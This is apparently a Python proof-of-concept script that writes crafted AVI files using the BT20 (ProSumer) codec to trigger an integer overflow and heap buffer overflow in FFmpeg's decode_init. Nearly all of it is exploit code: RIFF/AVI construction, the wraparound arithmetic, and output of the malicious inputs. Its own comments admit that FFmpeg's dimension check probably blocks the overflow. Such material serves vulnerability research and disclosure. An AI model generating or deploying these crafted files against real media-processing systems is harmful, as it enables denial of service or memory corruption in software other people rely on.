#!/usr/bin/env python3
"""
PoC generator for integer overflow in ProSumer decode_init (FFmpeg)
Source: libavcodec/prosumer.c

FourCC: BT20 (confirmed from libavformat/riff.c)
AV_CODEC_ID_PROSUMER maps to MKTAG('B','T','2','0')

Vulnerability (lines 339-345 of prosumer.c):
  s->stride = 3LL * FFALIGN(avctx->width, 8) >> 1;   // unsigned, but 64-bit intermediate
  s->size   = avctx->height * s->stride;               // OVERFLOW: uint32 wrap

For width=65536:
  FFALIGN(65536, 8) = 65536
  stride = 3 * 65536 / 2 = 98304

For height=43692:
  size = 43692 * 98304 = 4,295,098,368 wraps to 131,072 (mod 2^32)
  av_malloc(131072) allocates only 128KB

Then vertical_predict() writes height*stride = 4.3 GB -> heap buffer overflow

NOTE: This file attempts the original report dimensions (65536x43692) and
several fallback dimensions. In practice, av_image_check_size2() in
ff_set_dimensions() (called from avcodec_open2) rejects very large dims
before decode_init() can run. The fallback tries different size combinations.
"""

import struct
import sys

def make_chunk(tag, data):
    """Create RIFF chunk: 4-byte tag + uint32 LE size + data (padded to even)."""
    if isinstance(tag, str):
        tag = tag.encode('ascii')
    pad = b'\x00' if len(data) % 2 else b''
    return tag + struct.pack('<I', len(data)) + data + pad

def make_list(list_type, payload):
    """Create RIFF LIST chunk: LIST + uint32 LE size + 4-byte type + payload."""
    if isinstance(list_type, str):
        list_type = list_type.encode('ascii')
    inner = list_type + payload
    return b'LIST' + struct.pack('<I', len(inner)) + inner

def build_avi(width, height, fourcc=b'BT20', frame_data=None):
    """
    Build a minimal AVI file with one ProSumer video stream.

    Args:
        width:      biWidth in BITMAPINFOHEADER and dwWidth in MainAVIHeader
        height:     biHeight in BITMAPINFOHEADER and dwHeight in MainAVIHeader
        fourcc:     4-byte codec FourCC (b'BT20' for ProSumer)
        frame_data: raw bytes for the video frame chunk (default: 512 zero bytes)
    """
    if frame_data is None:
        # Packet must be > 32 bytes to pass decode_frame's initial check:
        #   if (avpkt->size <= 32) return AVERROR_INVALIDDATA;
        frame_data = bytes(512)

    biCompression = struct.unpack('<I', fourcc)[0]

    # ----------------------------------------------------------------
    # avih - Main AVI Header (56 bytes = 14 DWORDs)
    # ----------------------------------------------------------------
    avih = struct.pack('<IIIIIIIIIIIIII',
        33333,      # dwMicroSecPerFrame (~30 fps)
        0,          # dwMaxBytesPerSec
        0,          # dwPaddingGranularity
        0x10,       # dwFlags = AVIF_HASINDEX
        1,          # dwTotalFrames
        0,          # dwInitialFrames
        1,          # dwStreams
        0,          # dwSuggestedBufferSize
        width,      # dwWidth
        height,     # dwHeight
        0, 0, 0, 0  # dwReserved[4]
    )
    assert len(avih) == 56

    # ----------------------------------------------------------------
    # strh - Stream Header (56 bytes)
    #   4s fccType    + 4s fccHandler + I dwFlags
    #   + H wPriority + H wLanguage
    #   + I dwInitialFrames + I dwScale + I dwRate + I dwStart
    #   + I dwLength + I dwSuggestedBufferSize + I dwQuality + I dwSampleSize
    #   + 4h rcFrame (left, top, right, bottom as int16)
    # ----------------------------------------------------------------
    strh = struct.pack('<4s4sIHHIIIIIIIIhhhh',
        b'vids',      # fccType
        fourcc,       # fccHandler (ProSumer = BT20)
        0,            # dwFlags
        0,            # wPriority
        0,            # wLanguage
        0,            # dwInitialFrames
        1,            # dwScale
        30,           # dwRate  (30 fps)
        0,            # dwStart
        1,            # dwLength (1 frame total)
        0,            # dwSuggestedBufferSize
        0,            # dwQuality  (0 = default)
        0,            # dwSampleSize
        0, 0, 0, 0    # rcFrame: left, top, right, bottom
    )
    assert len(strh) == 56

    # ----------------------------------------------------------------
    # strf - BITMAPINFOHEADER (40 bytes)
    # ----------------------------------------------------------------
    strf = struct.pack('<IiiHHIIiiII',
        40,             # biSize
        width,          # biWidth  (signed LONG as int)
        height,         # biHeight (positive = bottom-up DIB)
        1,              # biPlanes
        24,             # biBitCount  (ProSumer outputs YUV411P internally)
        biCompression,  # biCompression = 'BT20'
        0,              # biSizeImage
        0,              # biXPelsPerMeter
        0,              # biYPelsPerMeter
        0,              # biClrUsed
        0               # biClrImportant
    )
    assert len(strf) == 40

    # ----------------------------------------------------------------
    # strl list
    # ----------------------------------------------------------------
    strl_payload = (
        make_chunk(b'strh', strh) +
        make_chunk(b'strf', strf)
    )
    strl_list = make_list(b'strl', strl_payload)

    # ----------------------------------------------------------------
    # hdrl list
    # ----------------------------------------------------------------
    hdrl_payload = make_chunk(b'avih', avih) + strl_list
    hdrl_list = make_list(b'hdrl', hdrl_payload)

    # ----------------------------------------------------------------
    # movi list  ('00dc' = compressed video stream 0)
    # ----------------------------------------------------------------
    video_chunk = make_chunk(b'00dc', frame_data)
    movi_list   = make_list(b'movi', video_chunk)

    # ----------------------------------------------------------------
    # idx1 - AVI index  (each entry = 16 bytes)
    # offset is relative to start of movi list DATA (after 'movi' tag)
    # The '00dc' chunk starts right after the 4-byte 'movi' tag, at offset 4.
    # ----------------------------------------------------------------
    idx1_entry = b'00dc' + struct.pack('<III',
        0x10,            # AVIIF_KEYFRAME
        4,               # dwOffset from start of movi data
        len(frame_data)  # dwChunkLength
    )
    idx1 = make_chunk(b'idx1', idx1_entry)

    # ----------------------------------------------------------------
    # Assemble RIFF AVI
    # ----------------------------------------------------------------
    avi_payload  = hdrl_list + movi_list + idx1
    riff_payload = b'AVI ' + avi_payload
    riff         = b'RIFF' + struct.pack('<I', len(riff_payload)) + riff_payload

    return riff


def stride_for(width):
    """Compute ProSumer internal stride: 3 * FFALIGN(width, 8) / 2."""
    aligned = (width + 7) & ~7
    return 3 * aligned // 2


def size_wrapped(width, height):
    """Compute s->size = height * stride, wrapping to uint32."""
    s = stride_for(width)
    product = height * s
    return product & 0xFFFFFFFF, s, product


def av_check_stride(width, height):
    """
    Emulate av_image_check_size2 stride test (pix_fmt=NONE):
      stride = 8*w + 128*8
      stride * (h + 128) >= INT_MAX  => FAIL
    Returns True if the dimensions would PASS the check.
    """
    INT_MAX = (1 << 31) - 1
    stride  = 8 * width + 128 * 8
    return stride * (height + 128) < INT_MAX


def av_check_pixels(width, height, max_pixels=None):
    """
    Emulate av_image_check_size2 max_pixels test.
    Default max_pixels = INT_MAX (from AVCodecContext option default).
    Returns True if the dimensions would PASS the check.
    """
    if max_pixels is None:
        max_pixels = (1 << 31) - 1
    return width * height <= max_pixels


# ----------------------------------------------------------------
# Dimension sets to try (width, height)
# Primary goal: cause s->size overflow while passing av_image_check_size2
#
# Mathematical note: it is provably impossible for BOTH conditions to hold
# simultaneously when av_image_check_size2 uses stride=8*w and prosumer
# uses stride=3*w/2.  The ratio is ~5.3x, meaning the overflow requires
# ~10.7x more "pixel area" than av_image_check_size2 allows.
#
# We include them here to confirm the behavior and for documentation:
#   - The first entry is the original report's dimensions.
#   - Further entries explore the boundary.
# ----------------------------------------------------------------
DIMENSION_SETS = [
    # (width, height, note)
    (65536,  43692,  "original report: stride=98304, size wraps to 131072"),
    (32768,  87382,  "halved width, doubled height"),
    (16384,  174763, "quarter width, 4x height"),
    (8192,   349526, "1/8 width"),
    (4096,   699052, "1/16 width, wraps to ~2KB"),
    (2048,   1398102, "1/32 width"),
    (1024,   2796204, "1/64 width"),
    (512,    5592406, "1/128 width"),
    (256,    11184810, "1/256 width"),
]


def main():
    import os

    print("[*] ProSumer integer overflow PoC generator")
    print(f"[*] FourCC: BT20 (AV_CODEC_ID_PROSUMER in libavformat/riff.c)")
    print()

    # -- Check each dimension set --
    chosen_width  = None
    chosen_height = None
    for w, h, note in DIMENSION_SETS:
        stride  = stride_for(w)
        wrapped, _, product = size_wrapped(w, h)
        passes_stride = av_check_stride(w, h)
        passes_pixels = av_check_pixels(w, h)
        overflow = product > 0xFFFFFFFF
        print(f"  {w:6d}x{h:<9d} stride={stride:8d}  s->size={wrapped:10d}"
              f"  overflow={'YES' if overflow else 'no ':3s}"
              f"  av_check={'PASS' if (passes_stride and passes_pixels) else 'FAIL'}"
              f"  # {note}")
        if overflow and passes_stride and passes_pixels and chosen_width is None:
            chosen_width, chosen_height = w, h

    print()
    if chosen_width is None:
        print("[!] No dimension set found that BOTH overflows AND passes av_image_check_size2.")
        print("[!] This confirms the mathematical impossibility: the overflow requires")
        print("[!] h*stride_prosumer > 2^32, but av_image_check_size2 requires")
        print("[!] h*(8*w + 1024) < 2^31. The ratio (8w)/(3w/2) = 5.33x means the")
        print("[!] overflow always requires ~10.7x more area than the check allows.")
        print("[!] Using original report dimensions (65536x43692) for the PoC anyway.")
        chosen_width, chosen_height = 65536, 43692

    w, h = chosen_width, chosen_height
    stride = stride_for(w)
    wrapped, _, product = size_wrapped(w, h)
    print(f"[+] Using width={w}, height={h}")
    print(f"[+] ProSumer stride = {stride}")
    print(f"[+] s->size = {h} * {stride} = {product} -> wrapped to {wrapped}")
    if product > 0xFFFFFFFF:
        print(f"[+] OVERFLOW: av_malloc({wrapped}) allocates only {wrapped} bytes")
        print(f"[+] vertical_predict will try to write {product} bytes -> CRASH")
    else:
        print(f"[!] No overflow with these dimensions (product fits in uint32)")
    print()

    # Generate primary PoC
    out = "vuln_001_input.avi"
    data = build_avi(w, h)
    with open(out, 'wb') as f:
        f.write(data)
    print(f"[+] Written {out} ({len(data)} bytes)")

    # Generate a second file with the exact report dimensions (if different)
    if (w, h) != (65536, 43692):
        out2 = "vuln_001_input_report.avi"
        data2 = build_avi(65536, 43692)
        with open(out2, 'wb') as f:
            f.write(data2)
        print(f"[+] Written {out2} ({len(data2)} bytes) [original report dims]")

    print("[+] Done.")


if __name__ == "__main__":
    main()
